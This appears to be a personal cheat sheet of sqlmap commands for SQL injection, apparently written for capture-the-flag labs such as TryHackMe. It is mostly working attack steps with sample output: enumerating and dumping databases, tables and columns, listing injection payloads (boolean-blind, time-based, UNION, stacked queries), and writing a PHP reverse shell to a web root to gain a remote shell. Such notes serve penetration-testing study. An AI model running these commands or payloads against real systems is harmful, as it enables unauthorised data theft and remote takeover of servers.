---
title: Sqlmap 🪲
---
- Useful commands

```shell
sqlmap http://10.10.134.119/admin?user=3 --cookie='token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE3MDc1NzM3Mzh9.EQ-QxUbiFb5WYxEP6e8izPs_r4iGouEevWSjuhE1ZaM' --technique=U --delay=2 -dump
```

- Command with a request with no query params on url:
	- First, copy the request captured with Burp to a file
	- Then:

```shell
sqlmap -r request.txt

# Then do
sqlmap -r request.txt --dbs

# Attack the database you want

sqlmap -r request.txt -D <TABLE_NAME> --tables --dump

# a more complete command
sqlmap -r request.txt -p 'email' --dbms=mysql --level=3 --risk=3 --batch --technique=BUT --dbs --dump --threads 3
```

---

## Get a reverse shell with slqmap:

```shell
sqlmap -r request.txt --dbs --file-dest=/var/www/html/reverse.php --file-write=./reverse.php
```

- Now open open your browser: `http://IP_HOST/reverse.php`

---
## Display databases when performing a successful attack

If you got a successful payload, then do this:
- Extract databases by adding `--dbs` to the original attack:
	- Just say `y` and will load the previous results.

```shell
sqlmap -u 'http://domain.com/path' -H 'X-Forwarded-For: YOUR_IP*' --risk 3 --level 5 --dbms MySQL --dbs

# Output may be like:
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 8.0.0
[22:27:40] [INFO] fetching database names
[22:27:40] [INFO] fetching number of databases
[22:27:40] [INFO] retrieved: 2
[22:27:42] [INFO] retrieved: informati
on_schema
[22:28:47] [INFO] retrieved: sqhell_1
available databases [2]:
[*] information_schema
[*] sqhell_1
```

- Now that you know the databases, get the tables of the one you are interested:

```shell
sqlmap -u 'http://domain.com/path' -H 'X-Forwarded-For: YOUR_IP*' --risk 3 --level 5 --dbms MySQL -D DATBASE_NAME --tables

# Output may be like:
[22:31:23] [INFO] retrieved: 
[22:31:28] [INFO] adjusting time delay to 1 second due to good response times
flag
[22:31:41] [INFO] retrieved: hits
Database: sqhell_1
[2 tables]
+------+
| flag |
| hits |
+------+
```

- Now list columns of a database table:

```shell
sqlmap -u 'http://domain.com/path' -H 'X-Forwarded-For: YOUR_IP*' --risk 3 --level 5 --dbms MySQL -D DATBASE_NAME -T TABLE --columns

# Output may be like:
[22:33:58] [INFO] retrieved: 
[22:34:03] [INFO] adjusting time delay to 1 second due to good response times
id
[22:34:09] [INFO] retrieved: int
[22:34:21] [INFO] retrieved: flag
[22:34:35] [INFO] retrieved: varchar(250)
Database: sqhell_1
Table: flag
[2 columns]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| flag   | varchar(250) |
| id     | int          |
+--------+--------------+
```

- Now dump it the table's column:

```shell
sqlmap -u 'http://domain.com/path' -H 'X-Forwarded-For: YOUR_IP*' --risk 3 --level 5 --dbms MySQL -D DATBASE_NAME -T TABLE -C COLUMN --dump

# Output may be like:

[22:36:07] [INFO] adjusting time delay to 1 second due to good response times
THM{FLAG2:C678ABFE1C01FCA19E03901CEDAB1D15}
Database: sqhell_1
Table: flag
[1 entry]
+---------------------------------------------+
| flag                                        |
+---------------------------------------------+
| XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX |
+---------------------------------------------+
```

## Register forms

```shell
sqlmap -u 'http://domain.com/register/user-check?username=gitblanc' -p username --risk 3 --level 5 --dbms MySQL

# Output may be like:
[22:53:35] [INFO] checking if the injection point on GET parameter 'username' is a false positive
GET parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 468 HTTP(s) requests:
---
Parameter: username (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: username=-3381' OR 3435=3435-- ihVx

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=gitblanc' AND (SELECT 8410 FROM (SELECT(SLEEP(5)))sPpn)-- xphf
---
```

- Then you can try to obtain databases by adding at the end `--dbs`
- Then obtain tables by adding `-D DATBASE_NAME --tables` replacing `--dbs`
- Then obtain columns by adding `-T TABLE --columns` replacing `--tables`
- Then dump a columns by adding `-C COLUMN --dump` replacing `--columns`

## URL parameters

- If you find something like: `http://10.10.115.157/user?id=1`
- Try this:

```shell
sqlmap -u 'http://10.10.115.157/user?id=1' -p id --risk 3 --level 5 --dbms MySQL

# Output may be like:
[23:02:27] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 59 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 3835=3835

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: id=1;SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 5327 FROM (SELECT(SLEEP(5)))tHWS)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-4293 UNION ALL SELECT CONCAT(0x7162787171,0x5648626b46674875456f46496a4c746c5a4e4462736575774246467a477a70414d655351486f546e,0x717a707671),NULL,NULL-- -
---

```